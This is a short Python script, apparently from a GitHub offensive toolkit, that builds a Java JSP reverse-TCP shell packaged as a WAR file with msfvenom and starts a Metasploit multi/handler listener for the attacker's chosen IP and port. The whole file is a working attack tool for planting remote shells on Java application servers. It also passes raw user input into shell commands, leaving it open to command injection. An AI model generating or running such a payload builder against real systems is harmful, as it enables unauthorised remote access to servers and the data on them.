import os

#GeerxOS on github!

def war():
    os.system("clear")
    os.system("figlet -f banner war ")
    print("--> ")
    ip = input("IP: ")
    print("--> ")
    port = input("Port: ")
    print("--> ")
    name = input("Name: ")
    payload = 'java/jsp_shell_reverse_tcp'
    format= 'war'
    ext= '.war'
    print("[!] Creating payload!! [!] ")
    os.system("msfvenom -p "+payload+" LHOST="+ip+" LPORT="+port+" -f "+format+" -o "+name+ext+"")
    print("Payload created!!")
    print("Running metasploit-framework!")
    os.system("echo 'use exploit/multi/handler' >> war.rb")
    os.system("echo 'set payload "+payload+"' >> war.rb")
    os.system("echo 'set lhost "+ip+"' >> war.rb")
    os.system("echo 'set lport "+port+"' >> war.rb")
    os.system("echo 'exploit' >> war.rb")
    os.system("gnome-terminal -- msfconsole -r war.rb &")
    input("Press enter")
    os.system("clear")